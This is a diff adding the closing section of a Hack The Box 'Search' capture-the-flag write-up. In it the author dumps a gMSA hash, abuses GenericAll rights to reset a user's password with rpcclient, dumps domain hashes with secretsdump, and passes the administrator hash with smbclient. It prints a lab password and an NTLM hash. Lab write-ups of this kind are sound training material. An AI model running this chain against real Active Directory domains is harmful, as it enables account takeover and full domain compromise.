@@ -416,3 +416,73 @@ Which we can easily abuse now.
 ![image](https://user-images.githubusercontent.com/69868171/154502573-9a9eb60a-cb3c-417c-af42-7d272c36744f.png)
 
 Since sierra.frye is a member of the ITSEC@search.htb group, this user has access to all the group permissions. We can easily use [gMSADumper](https://github.com/micahvandeusen/gMSADumper) on our attacking machine to do that.
+
+```
+python3 gMSADumper.py -d search.htb -u 'sierra.frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' 
+```
+
+![image](https://user-images.githubusercontent.com/69868171/154504169-162fb442-60fd-4ceb-9f5b-af3c7888341f.png)
+
+
+Now that we have the GMSA hash let check the next step.
+
+### GenericAll
+
+```
+The user BIR-ADFS-GMSA@SEARCH.HTB has GenericAll privileges to the user TRISTAN.DAVIES@SEARCH.HTB.
+
+This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.
+```
+
+![image](https://user-images.githubusercontent.com/69868171/154504625-6b5eac9a-30ab-4ff7-ab23-69e1ee741273.png)
+
+
+Since we know this user has GenericAll privileges on tristan.davies, not knowing tristan’s password, I proceed to [reset his password using rpcclient](https://malicious.link/post/2017/reset-ad-user-password-with-linux/) using the bir-adfs-gmsa account and the obtained hash.
+
+
+```
+┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.129]
+└─$ rpcclient -U bir-adfs-gmsa$ -W search.htb search.htb  --pw-nt-hash                                                                                             1 ⨯
+Enter SEARCH.HTB\bir-adfs-gmsa$'s password: 
+rpcclient $> setuserinfo2 tristan.davies 23 'password'
+rpcclient $> 
+```
+
+Now we have successfully change `tristan.davies` password.
+
+```
+The user TRISTAN.DAVIES@SEARCH.HTB is a member of the group DOMAIN ADMINS@SEARCH.HTB. Groups in active directory grant their members any privileges the group itself has. If a group has rights to another principal, users/computers in the group, as well as other groups inside the group inherit those permissions.
+```
+
+![image](https://user-images.githubusercontent.com/69868171/154510909-35551d15-903e-4ec1-ab88-c3b8bb84423f.png)
+
+Since we know `tristan.davies` is a memeber of `domain admin` we can easily dump all hashes.
+
+```
+┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.129]                                                                                                              
+└─$ secretsdump.py search.htb/tristan.davies:password@10.10.11.129 -just-dc 
+```
+
+![image](https://user-images.githubusercontent.com/69868171/154512250-934b70c5-3082-4596-bcb6-124a948510ad.png)
+
+Let it rain hashes XD. Now that we have the hashes of the admin we can easily use `Pass The Hash` to get access to the target to get the `root.txt` flag.
+
+```
+┌──(muzec㉿Muzec-Security)-[~/Documents/HTB/10.10.11.129]
+└─$ smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6 administrator@search.htb
+```
+
+![image](https://user-images.githubusercontent.com/69868171/154513484-d6eaf35d-95b5-49dd-b2e4-bde60d13ffe9.png)
+
+
+![image](https://user-images.githubusercontent.com/69868171/154513624-fda8b459-cbba-4234-9850-f32698a2fb38.png)
+
+We are done Boom hope you have fun.
+
+A quick notice:- i was unable to get a proper cmd shell or powershell since we keep getting blocked by the AV would really love to know if anyone find another way to get a proper shell peace out.
+
+Greeting From [Muzec](https://twitter.com/muzec_saminu)
+
+<br> <br>
+[Back To Home](../index.md)
+<br>
